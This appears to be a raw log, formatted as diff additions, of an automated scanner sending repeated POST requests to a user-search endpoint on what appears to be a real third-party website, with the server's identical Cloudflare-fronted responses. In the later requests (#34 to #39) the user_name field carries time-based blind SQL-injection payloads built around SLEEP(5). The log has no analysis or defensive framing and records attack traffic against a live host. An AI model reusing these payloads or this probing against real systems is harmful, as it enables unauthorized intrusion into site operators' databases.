+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#21] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=df04b0a9b328f432455dbaef2e33a88f91589277802; expires=Thu, 11-Jun-20 10:03:22 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9efd7330000ed7f14859200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:22 GMT
+Cf-ray: 59234f385cdbed7f-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#22]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#22] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d5f36b30bac670b0bc94405bf038230bf1589277808; expires=Thu, 11-Jun-20 10:03:28 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9efee24000092da4509d200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:28 GMT
+Cf-ray: 59234f5d0c9d92da-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#23]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#23] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d079e51d3b8bf955fe123f3d9725b79d41589277811; expires=Thu, 11-Jun-20 10:03:31 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9effbf40000928c0dbea200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:31 GMT
+Cf-ray: 59234f732a32928c-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#24]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#24] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d36fddffc0524499a1680525ed26bc2bc1589277817; expires=Thu, 11-Jun-20 10:03:37 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f0115400000285a93af200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:37 GMT
+Cf-ray: 59234f9559ef0285-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#25]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#25] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=df33e4af91ad558d92ad83b2cd805278e1589277820; expires=Thu, 11-Jun-20 10:03:40 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f01fa30000027bf019d200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:41 GMT
+Cf-ray: 59234fac3f25027b-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#26]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#26] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d2b2aeb5306fd0b11b7fe33ac7665092d1589277824; expires=Thu, 11-Jun-20 10:03:44 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f02df30000ed07a229d200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:44 GMT
+Cf-ray: 59234fc319fbed07-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#27]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#27] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d483999061a5879256a99f8f709b1cf6a1589277827; expires=Thu, 11-Jun-20 10:03:47 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f038290000ed0763814200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:47 GMT
+Cf-ray: 59234fd37c46ed07-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#28]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#28] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d65757fe68e66eee3efdeae33415dcb411589277829; expires=Thu, 11-Jun-20 10:03:49 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f042f40000025ecabdd200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:50 GMT
+Cf-ray: 59234fe4bf80025e-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#29]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#29] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d6b2362d35a47dd21d87e2a45333189bc1589277835; expires=Thu, 11-Jun-20 10:03:55 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f058260000ed174d28d200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:55 GMT
+Cf-ray: 59235006abc2ed17-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#30]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#30] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d6f82759c8a23665c0cca44f9047393981589277838; expires=Thu, 11-Jun-20 10:03:58 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f0637500006cda5839c200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:58 GMT
+Cf-ray: 59235018bb086cda-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#31]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#31] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d52ff20c7d4c45431fc8449b356865ee01589277842; expires=Thu, 11-Jun-20 10:04:02 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f073010000ed3fe91e4200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:02 GMT
+Cf-ray: 5923503199feed3f-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#32]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#32] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d9b9297ef27037ac00bd150f725ff88551589277846; expires=Thu, 11-Jun-20 10:04:06 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f0833c00000293f2285200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:06 GMT
+Cf-ray: 5923504b9daa0293-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#33]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#33] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=de75895756c5fe65df771757b117203bf1589277850; expires=Thu, 11-Jun-20 10:04:10 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f092a9000093c429a67200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:10 GMT
+Cf-ray: 592350644a9f93c4-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#34]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 67
+Connection: close
+
+user_name=admin%29%20or%20SLEEP%285%29%20or%20%281969%3D1969&type=1
+
+HTTP response [#34] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=dd90f6b742c4bb3b0e19d763b565759821589277853; expires=Thu, 11-Jun-20 10:04:13 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f09fcb0000023176b29200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:13 GMT
+Cf-ray: 592350794cc90231-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#35]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 42
+Connection: close
+
+user_name=admin%20or%20SLEEP%285%29&type=1
+
+HTTP response [#35] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d40ee03f08280042dd2c4b4e2ee34c00a1589277855; expires=Thu, 11-Jun-20 10:04:15 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f0a8d40000ed4fd8330200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:16 GMT
+Cf-ray: 59235087bcb9ed4f-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#37]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 73
+Connection: close
+
+user_name=admin%27%20or%20SLEEP%285%29%20or%20%27AFMn%27%3D%27AFMn&type=1
+
+HTTP response [#37] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=dd0e42666f86c6604ae68386b66b8797d1589277866; expires=Thu, 11-Jun-20 10:04:26 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f0d2ad000095f3a10a6200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:26 GMT
+Cf-ray: 592350caa89295f3-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#39]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 51
+Connection: close
+
+user_name=admin%20or%20SLEEP%285%29--%20SPhr&type=1
+
+HTTP response [#39] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=ddc3bd61f94a13ad10540ae2759e0fd9f1589277878; expires=Thu, 11-Jun-20 10:04:38 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9f1018500006c742b2c6200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:04:38 GMT
+Cf-ray: 59235115ab016c74-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
